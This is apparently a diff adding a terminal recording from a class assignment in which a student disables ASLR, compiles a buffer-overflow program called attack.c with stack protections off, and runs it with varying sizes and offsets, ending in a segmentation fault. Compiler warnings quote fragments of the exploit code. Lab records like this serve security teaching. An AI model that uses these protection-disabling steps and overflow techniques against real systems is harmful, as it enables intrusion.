@@ -1,0 +1,74 @@
+Script started on Fri Mar 31 23:54:31 2017
+]0;rahpsing@js-156-100: /class/assignmentrahpsing@js-156-100:/class/assignment$ exit./attack 1040 119842016008841090201000gcc -z execstack -fno-stack-protector -o aattack attack.c [A100:/class/assignment$ echo 0 | sudo tee /proc/sys/kernel/randomi[3Pze_va_space [A56-100:/class/assignment$ exit[K
+[K[Arahpsing@js-156-100:/class/assignment$ exitcho 0 | sudo tee /proc/sys/kernel/randomiize_va_space 
+0
+]0;rahpsing@js-156-100: /class/assignmentrahpsing@js-156-100:/class/assignment$ [Kecho 0 | sudo tee /proc/sys/kernel/randomiize_va_space [A56-100:/class/assignment$ exit[K
+[K[Arahpsing@js-156-100:/class/assignment$ exit./attack 1040 119842016008841090201000gcc -z execstack -fno-stack-protector -o aattack attack.c [A100:/class/assignment$ echo 0 | sudo tee /proc/sys/kernel/randomi[3Pze_va_space [A56-100:/class/assignment$ gcc -z execstack -fno-stack-protector -o attack attack.c 
+attack.c: In function 'main':
+attack.c:19:7: warning: incompatible implicit declaration of built-in function 'exit' [enabled by default]
+       exit(0);
+       ^
+attack.c:23:14: warning: incompatible implicit declaration of built-in function 'malloc' [enabled by default]
+       buff = malloc(bsize); 
+              ^
+attack.c:24:12: warning: assignment makes pointer from integer without a cast [enabled by default]
+       addr = get_sp() -offset;
+            ^
+attack.c:25:24: warning: initialization makes pointer from integer without a cast [enabled by default]
+       long *stackptr = get_sp();
+                        ^
+attack.c:27:7: warning: format '%x' expects argument of type 'unsigned int', but argument 2 has type 'long long int *' [-Wformat=]
+       printf("\nUsing address as guess for beginning of attack buffer: 0x%x\n", addr); 
+       ^
+attack.c:33:18: warning: assignment makes integer from pointer without a cast [enabled by default]
+       *(addr_ptr)=addr;
+                  ^
+attack.c:38:23: warning: assignment makes integer from pointer without a cast [enabled by default]
+       buff[bsize - 1] = (char*)NULL; 
+                       ^
+]0;rahpsing@js-156-100: /class/assignmentrahpsing@js-156-100:/class/assignment$ [Kgcc -z execstack -fno-stack-protector -o aattack attack.c [A100:/class/assignment$ echo 0 | sudo tee /proc/sys/kernel/randomi[3Pze_va_space [A56-100:/class/assignment$ exit[K
+[K[Arahpsing@js-156-100:/class/assignment$ exit./attack 1040 11984
+
+Using address as guess for beginning of attack buffer: 0xffffb430
+
+Length of Input String:1038
+
+
+Value of Test:ffffb838
+Value of filename[0]:ffffb430
+
+You are going to need a buffer a little larger than:1032
+
+]0;rahpsing@js-156-100: /class/assignmentrahpsing@js-156-100:/class/assignment$ ./attack 1040 11984[1@0[1@0[1@0
+
+Using address as guess for beginning of attack buffer: 0xffffb430
+]0;rahpsing@js-156-100: /class/assignmentrahpsing@js-156-100:/class/assignment$ ./attack 1040000 11984[1P[1P[1P[1P
+
+Using address as guess for beginning of attack buffer: 0xffffb430
+
+Length of Input String:102
+
+
+Value of Test:ffffbbd8
+Value of filename[0]:ffffb7d0
+
+You are going to need a buffer a little larger than:1032
+
+]0;rahpsing@js-156-100: /class/assignmentrahpsing@js-156-100:/class/assignment$ ./attack 104 11984[1P
+
+Using address as guess for beginning of attack buffer: 0xffffb430
+
+Length of Input String:9
+
+
+Value of Test:ffffbc38
+Value of filename[0]:ffffb830
+
+You are going to need a buffer a little larger than:1032
+
+]0;rahpsing@js-156-100: /class/assignmentrahpsing@js-156-100:/class/assignment$ ./attack 10 11984[1@2[1@5[1@4[1@6[1@5[1@5[1@8[1@4[1@5[1@2[1@5[1@4
+
+Using address as guess for beginning of attack buffer: 0xffffb420
+Segmentation fault (core dumped)
+]0;rahpsing@js-156-100: /class/assignmentrahpsing@js-156-100:/class/assignment$ exit
+Script done on Fri Mar 31 23:56:40 2017
